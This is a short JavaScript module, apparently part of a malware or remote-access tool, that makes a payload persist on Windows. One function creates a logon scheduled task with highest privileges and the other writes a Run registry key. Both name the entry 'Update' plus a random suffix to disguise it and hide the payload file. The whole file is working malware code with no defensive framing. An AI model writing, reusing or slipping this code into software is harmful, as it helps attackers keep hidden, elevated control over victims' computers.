const childprocess = require('child_process');
const core = require('./core');

function addServicePersistence(persistencePath, random) {
    childprocess.execSync(`cmd /c schtasks /create /sc onlogon /tn Update${random} /tr \\"${persistencePath}\\" /F /rl highest`);
    core.hideFile(persistencePath);
}

function addRegistryPersistence(persistencePath, random) {
    childprocess.execSync(`powershell -Command "New-ItemProperty -Path \\"Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" -Name \\"Update${random}\\" -Value \\"${persistencePath}\\""`);
    core.hideFile(persistencePath);
}

module.exports = {
    addServicePersistence,
    addRegistryPersistence
}